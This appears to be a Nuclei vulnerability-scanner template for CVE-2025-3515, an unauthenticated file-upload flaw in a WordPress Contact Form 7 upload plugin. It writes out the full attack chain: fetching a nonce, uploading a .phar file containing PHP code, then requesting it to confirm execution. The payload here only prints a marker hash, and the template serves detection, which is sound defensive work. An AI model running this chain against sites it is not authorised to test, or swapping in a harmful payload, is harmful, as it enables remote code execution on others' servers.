id: CVE-2025-3515

info:
  name: Drag and Drop Multiple File Upload for Contact Form 7 <= 1.3.8.9 - Unrestricted File Upload (RCE)
  author: ImBIOS
  severity: high
  description: |
    The WordPress plugin "Drag and Drop Multiple File Upload for Contact Form 7" (slug: drag-and-drop-multiple-file-upload-contact-form-7) up to and including 1.3.8.9 allows unauthenticated arbitrary file upload via the ddmu_upload_file AJAX action. An attacker can upload executable files (e.g., .php/.phar). On servers configured to execute such files (e.g., Apache + mod_php), this can lead to remote code execution.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-3515
    - https://github.com/Professor6T9/CVE-2025-3515
  classification:
    cwe-id: CWE-434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cve-id: CVE-2025-3515
  metadata:
    vendor: codedropz
    product: drag-and-drop-multiple-file-upload-contact-form-7
    framework: wordpress
    verified: false
    max-request: 2
  tags: cve,cve2025,wordpress,wp,wp-plugin,contact-form-7,fileupload,rce,intrusive

variables:
  boundary: '{{randstr}}'
  filename: '{{randbase(8)}}'
  marker: '{{randstr}}'

flow: http(1) && http(2) && http(3)

http:
  - raw:
      - |
        GET /wp-admin/admin-ajax.php?action=__wpcf7_check_nonce HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
        internal: true
    extractors:
      - type: regex
        name: nonce
        part: body
        group: 1
        internal: true
        regex:
          - '"success":true,\s*"data":"([^"]+)"'

  - raw:
      - |
        POST /wp-admin/admin-ajax.php?action=dnd_codedropz_upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}

        ------WebKitFormBoundary{{boundary}}
        Content-Disposition: form-data; name="security"

        {{nonce}}
        ------WebKitFormBoundary{{boundary}}
        Content-Disposition: form-data; name="form_id"

        1
        ------WebKitFormBoundary{{boundary}}
        Content-Disposition: form-data; name="upload_name"

        upload-file
        ------WebKitFormBoundary{{boundary}}
        Content-Disposition: form-data; name="upload-file"; filename="{{filename}}.phar"
        Content-Type: application/octet-stream

        <?php echo md5("{{marker}}"); ?>
        ------WebKitFormBoundary{{boundary}}--

    extractors:
      - type: regex
        name: uploaded_file
        part: body
        group: 1
        internal: true
        regex:
          - '"file":"([^"]+\.phar)"'
      - type: regex
        name: upload_path
        part: body
        group: 1
        internal: true
        regex:
          - '"path":"([^"]+)"'

  - raw:
      - |
        GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{upload_path}}/{{replace(uploaded_file, "-", "/")}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '{{md5(marker)}}')

